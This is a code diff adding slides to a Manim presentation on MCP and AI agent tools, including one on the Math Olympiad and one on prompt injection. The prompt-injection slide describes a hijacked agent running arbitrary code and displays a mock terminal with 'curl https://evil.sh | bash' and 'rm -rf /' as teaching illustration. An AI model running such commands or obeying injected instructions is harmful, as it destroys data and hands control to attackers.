@@ -127,6 +127,8 @@ class MCPPresentation(Slide):
         self._slide_mcp_adopters()
         self._slide_why_tools()
         self._slide_strawberry()
+        self._slide_ai_imo_win()
+        self._slide_prompt_injection()
         self._slide_langchain_tool_intro()
         self._slide_langchain_tool_flow()
         self._slide_tools_problems()
@@ -395,11 +397,11 @@ class MCPPresentation(Slide):
 
         # ── Company / project data ───────────────────────────────────────────────
         companies = [
-            ("c1.jpg", "GitHub",   "",     CRAIL),
-            ("c2.png", "Canva",    "",     SEC),
-            ("c3.jpg", "Figma",    "",   TERT),
-            ("c4.png", "Blender",  "",         CLOUDY),
-            ("c5.png", "Ghidra",   "",   DARK),
+            ("companies/c1.jpg", "GitHub",   "Repos",     CRAIL),
+            ("companies/c2.png", "Canva",    "Desing",     SEC),
+            ("companies/c3.jpg", "Figma",    "Desing",   TERT),
+            ("companies/c4.png", "Blender",  "3D modeling",         CLOUDY),
+            ("companies/c5.png", "Ghidra",   "Reverse\n Engineer",   DARK),
         ]
 
         IMG_W, IMG_H = 1.0, 1.0   # image bounding box
@@ -413,7 +415,7 @@ class MCPPresentation(Slide):
                 corner_radius=0.18,
                 width=CARD_W,
                 height=CARD_H,
-                fill_color=DARK,
+                fill_color=BG,
                 fill_opacity=1,
                 stroke_color=accent,
                 stroke_width=2.5,
@@ -516,7 +518,7 @@ class MCPPresentation(Slide):
         self.play(Write(solution))
 
         # meme.jpg if present
-        meme_path = "meme.jpg"
+        meme_path = "memes/6.jpg"
         if os.path.exists(meme_path):
             meme = (
                 ImageMobject(meme_path).scale_to_fit_width(3.2).to_corner(DR, buff=0.55)
@@ -631,7 +633,181 @@ class MCPPresentation(Slide):
         self.play(FadeIn(cblock))
         self.next_slide()
         self._clear()
+    def _slide_ai_imo_win(self):
+        anchor = self._header("AI Conquers the Math Olympiad")
 
+        # ── Headline ────────────────────────────────────────────────────────────
+        row1_data = [("OpenAI  o3", CRAIL), ("  &  ", DARK), ("Gemini", SEC)]
+        row2_data = [("win", TERT), ("  🥇 Gold  ", DARK), ("at IMO 2025", CRAIL)]
+
+        row1 = VGroup(
+            *[B(w, color=c, weight=BOLD if c != DARK else NORMAL, scale=0.66) for w, c in row1_data]
+        ).arrange(RIGHT, buff=0.1)
+        row2 = VGroup(
+            *[B(w, color=c, weight=BOLD if c != DARK else NORMAL, scale=0.66) for w, c in row2_data]
+        ).arrange(RIGHT, buff=0.1)
+        headline = VGroup(row1, row2).arrange(DOWN, buff=0.15).next_to(anchor, DOWN, buff=0.35)
+        headline.set_x(0)
+
+        # ── Sub-caption ─────────────────────────────────────────────────────────
+        caption = B(
+            "They generated code — because math is just logic, right?",
+            color=DARK,
+            scale=0.46,
+        ).next_to(headline, DOWN, buff=0.22)
+        caption.set_x(0)
+
+        # ── Image cards ─────────────────────────────────────────────────────────
+        IMG_MAX = 2.6
+        CARD_W, CARD_H = 3.0, 3.2
+        CARD_BUFF = 0.35
+
+        cards_data = [
+            ("kaggle_imo.png",  "Kaggle IMO\nChallenge",   CRAIL),
+            ("memes/3.jpeg",          "The News",                SEC),
+            ("memes/happy.png", "Researchers\nright now",  TERT),
+        ]
+
+        cards = Group()
+        for img_file, label_text, accent in cards_data:
+            bg = RoundedRectangle(
+                corner_radius=0.18,
+                width=CARD_W,
+                height=CARD_H,
+                fill_color=DARK,
+                fill_opacity=1,
+                stroke_color=accent,
+                stroke_width=2.5,
+            )
+            img = ImageMobject(img_file).set_resampling_algorithm(RESAMPLING_ALGORITHMS["nearest"])
+            img.set_width(min(img.get_width(), IMG_MAX))
+            if img.get_height() > IMG_MAX:
+                img.scale_to_fit_height(IMG_MAX)
+
+            lbl = B(label_text, color=accent, weight=BOLD, scale=0.46)
+
+            content = Group(img, lbl).arrange(DOWN, buff=0.2)
+            content.move_to(bg.get_center())
+            cards.add(Group(bg, content))
+
+        cards.arrange(RIGHT, buff=CARD_BUFF).next_to(caption, DOWN, buff=0.45)
+        cards.set_x(0)
+
+        # ── Footer ───────────────────────────────────────────────────────────────
+        note = B(
+            "Generating executable code to solve formal proofs — the boundaries keep moving",
+            color=SEC,
+            scale=0.42,
+        ).next_to(cards, DOWN, buff=0.35)
+        note.set_x(0)
+
+        # ── Animations ───────────────────────────────────────────────────────────
+        self.play(LaggedStart(*[Write(p) for p in [*row1, *row2]], lag_ratio=0.06))
+        self.play(FadeIn(caption))
+        self.play(
+            LaggedStart(*[FadeIn(c, shift=UP * 0.25) for c in cards], lag_ratio=0.15)
+        )
+        self.play(FadeIn(note))
+        self.next_slide()
+        self._clear()
+
+
+    def _slide_prompt_injection(self):
+        anchor = self._header("When AI Goes Wrong: Prompt Injection")
+
+        # ── Headline ────────────────────────────────────────────────────────────
+        row1_data = [("Malicious prompt", CRAIL), ("  hijacks", DARK)]
+        row2_data = [("the agent", SEC), ("  →  runs", DARK), ("arbitrary code", CRAIL)]
+
+        row1 = VGroup(
+            *[B(w, color=c, weight=BOLD if c != DARK else NORMAL, scale=0.66) for w, c in row1_data]
+        ).arrange(RIGHT, buff=0.1)
+        row2 = VGroup(
+            *[B(w, color=c, weight=BOLD if c != DARK else NORMAL, scale=0.66) for w, c in row2_data]
+        ).arrange(RIGHT, buff=0.1)
+        headline = VGroup(row1, row2).arrange(DOWN, buff=0.15).next_to(anchor, DOWN, buff=0.35)
+        headline.set_x(0)
+
+        # ── Terminal block (fake malicious command) ──────────────────────────────
+        terminal_lines = [
+            ("$ curl https://evil.sh | bash",          CRAIL),
+            ("Downloading payload... ██████ 100%",      DARK),
+            ("Executing: rm -rf /  --no-preserve-root", CRAIL),
+            ("ERROR: Catastrophic failure  💥",         SEC),
+        ]
+        terminal_bg = RoundedRectangle(
+            corner_radius=0.14,
+            width=7.8,
+            height=2.0,
+            fill_color="#0d0d0d",
+            fill_opacity=1,
+            stroke_color=CRAIL,
+            stroke_width=2,
+        )
+        term_lines_group = VGroup(
+            *[B(txt, color=col, weight=BOLD, scale=0.40) for txt, col in terminal_lines]
+        ).arrange(DOWN, aligned_edge=LEFT, buff=0.16)
+        term_lines_group.move_to(terminal_bg.get_center())
+        terminal = Group(terminal_bg, term_lines_group)
+        terminal.next_to(headline, DOWN, buff=0.45)
+        terminal.set_x(0)
+
+        # ── Meme images ──────────────────────────────────────────────────────────
+        MEME_H = 2.4
+
+        def make_meme_card(img_file, label_text, accent):
+            bg = RoundedRectangle(
+                corner_radius=0.18,
+                width=3.2,
+                height=MEME_H + 0.5,
+                fill_color=DARK,
+                fill_opacity=1,
+                stroke_color=accent,
+                stroke_width=2.5,
+            )
+            img = ImageMobject(img_file).set_resampling_algorithm(RESAMPLING_ALGORITHMS["nearest"])
+            img.set_width(min(img.get_width(), 2.8))
+            if img.get_height() > MEME_H:
+                img.scale_to_fit_height(MEME_H)
+            lbl = B(label_text, color=accent, weight=BOLD, scale=0.44)
+            content = Group(img, lbl).arrange(DOWN, buff=0.18)
+            content.move_to(bg.get_center())
+            return Group(bg, content)
+
+        meme_card_1 = make_meme_card("memes/surprise.png", "Every dev watching\nthe logs", SEC)
+        meme_card_2 = make_meme_card("memes/2.png",        "The attack in action",         CRAIL)
+
+        meme_row = Group(meme_card_1, meme_card_2).arrange(RIGHT, buff=0.4)
+        meme_row.next_to(terminal, DOWN, buff=0.45)
+        meme_row.set_x(0)
+
+        # ── Footer ───────────────────────────────────────────────────────────────
+        note = B(
+            "Never give an AI agent unrestricted tool access without sandboxing & approval steps",
+            color=CRAIL,
+            scale=0.42,
+        ).next_to(meme_row, DOWN, buff=0.35)
+        note.set_x(0)
+
+        # ── Animations ───────────────────────────────────────────────────────────
+        self.play(LaggedStart(*[Write(p) for p in [*row1, *row2]], lag_ratio=0.06))
+        self.play(FadeIn(terminal_bg), run_time=0.4)
+        self.play(
+            LaggedStart(
+                *[Write(ln) for ln in term_lines_group],
+                lag_ratio=0.25,
+            )
+        )
+        self.play(
+            LaggedStart(
+                FadeIn(meme_card_1, shift=UP * 0.3),
+                FadeIn(meme_card_2, shift=UP * 0.3),
+                lag_ratio=0.2,
+            )
+        )
+        self.play(FadeIn(note))
+        self.next_slide()
+        self._clear()
     # ══════════════════════════════════════════════════════════════════════════
     # SLIDE — From Python Function to LangChain Tool
     # ══════════════════════════════════════════════════════════════════════════
